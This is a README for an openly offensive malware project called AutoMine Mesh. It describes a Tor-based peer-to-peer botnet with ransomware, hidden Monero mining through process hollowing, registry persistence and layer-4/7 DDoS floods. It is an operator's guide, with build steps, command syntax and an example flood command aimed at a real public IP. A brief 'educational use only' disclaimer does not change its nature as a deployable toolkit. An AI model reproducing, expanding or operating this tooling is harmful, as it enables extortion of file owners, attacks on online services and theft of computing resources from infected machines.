# AutoMine Mesh: Advanced Decentralized Botnet

> **STATUS**: ACTIVE
> **VERSION**: 3.5 (Platform Split + Hybrid Modules)
> **ARCHITECTURE**: P2P Tor Mesh (Gossip Protocol)
> **VISIBILITY**: INVISIBLE (Tor Hidden Services)
> **PLATFORMS**: Windows (Full) & Linux (Lite)

## 1. System Overview

AutoMine is a research-grade, fully decentralized botnet architecture. It operates without a central Command & Control (C2) server, utilizing a **Tor Hidden Service P2P Mesh** for resilience and anonymity.

### The Trinity Architecture

1.  **👑 Master (C2 Controller)**:
    *   Stateless command injector.
    *   Connects to any random node in the mesh via Tor.
    *   Injects **Ed25519 Signed Commands**.
    *   Vanishes immediately after broadcasting.

2.  **🛡️ Bot Windows (Heavy Agent)**:
    *   **Full Feature Set**: Miner, Persistence, Ransomware, DDoS, P2P.
    *   **Persistence**: Registry Run Keys, Startup Folder, Service Masquerading.
    *   **Mining**: XMRig integration with process hollowing and smart config.

3.  **⚡ Bot Linux (Lite Agent)**:
    *   **Optimized for Servers**: High bandwidth/CPU focus.
    *   **Features**: P2P Mesh, Advanced DDoS, Ransomware.
    *   **Stripped**: No Mining, No Persistence (Systemd/Cron left to operator).

## 2. Capabilities & Modules

### 💥 DDoS Module (Layer 4 & 7)
*   **Layer 4 (Transport)**:
    *   `UDP_FLOOD`: High-volume packet spam.
    *   `TCP_SYN`: SYN flood to exhaust connection tables.
    *   `TCP_ACK`: ACK spam to bypass stateful firewalls.
*   **Layer 7 (Application)**:
    *   `HTTP_FLOOD`: Smart GET/POST requests with cache bypassing.
    *   `HTTP_RECURSIVE`: Spiders the target functionality to consume backend resources.
    *   `SLOWLORIS`: Holds connections open to exhaust Apache/Nginx workers.
    *   `HTTP_RUDY`: "R-U-Dead-Yet" POST flood.
    *   `HTTP2`: Multiplexing stream flood (CVE-2019-9511 style).

### 🔒 Ransomware Module
*   **Cryptography**: Hybrid Scheme.
    *   **Asymmetric**: X25519 (Elliptic Curve) for key exchange.
    *   **Symmetric**: ChaCha20Poly1305 (AEAD) for high-speed file encryption.
*   **Features**:
    *   **Intermittent Encryption**: Encrypts chunks of large files for speed.
    *   **Multi-threading**: Uses `Rayon` for parallel directory walking.
    *   **Safety**: Skips system directories (Windows, Program Files, /proc, /sys).
    *   **Notification**: Pop-up window & Desktop Text file.

### ⛏️ Miner Module (Windows Only)
*   **XMRig Core**: Embedded Monero miner.
*   **Stealth**: Injects into legitimate system processes (Process Hollowing).
*   **Smart throttling**: Auto-pause on user activity (mouse/keyboard).

## 3. Usage Guide

### 🛠️ One-Step Build
Use the unified generator script to compile the toolchain for both platforms.

```bash
./scripts/generate.sh
```
*Outputs:*
*   `target/release/master` (Controller)
*   `target/release/bot_windows.exe` (Windows Agent)
*   `target/release/bot_linux` (Linux Agent)

### 📡 Deploy Bootstrap
(Optional: Required for new nodes to find the mesh initially)
```bash
./target/release/bootstrap
# Output: Listening on 127.0.0.1:8080 (Mapped to Tor HS 80)
```

### 🎮 Master Control
The `master` tool is your command center.

**1. List Active Nodes (via Bootstrap Registry):**
```bash
./target/release/master list --bootstrap "ws://bootstrap_onion_address"
```

**2. Broadcast Global Command:**
```bash
# Syntax: ACTION PARAMETERS
./target/release/master broadcast \
  --bootstrap "ws://bootstrap_onion_address" \
  --key "keys/master.key" \
  --cmd "DDOS_L4 1.1.1.1|80|60|UDP_RANDOM"
```

**Supported Commands:**
*   `DDOS_L4 <IP>|<PORT>|<DURATION>|<METHOD>`
*   `DDOS_L7 <URL>|<PORT>|<DURATION>|<METHOD>`
*   `RANSOMWARE` (Triggers encryption)
*   `START_MINER` (Windows Only)
*   `STOP_MINER` (Windows Only)
*   `KILL_BOT` (Self-destruct)

## 4. Technical Stack
-   **Language**: Rust (2024 Edition).
-   **Network**: `arti` (Tor), `tokio` (Async), `serde` (JSON).
-   **Crypto**: `ed25519-dalek`, `chacha20poly1305`, `x25519-dalek`.

---

> **⚠️ EDUCATIONAL USE ONLY**: This software is designed for red-teaming and research into decentralized network resilience. The author is not responsible for illegal misuse. Be ethical.
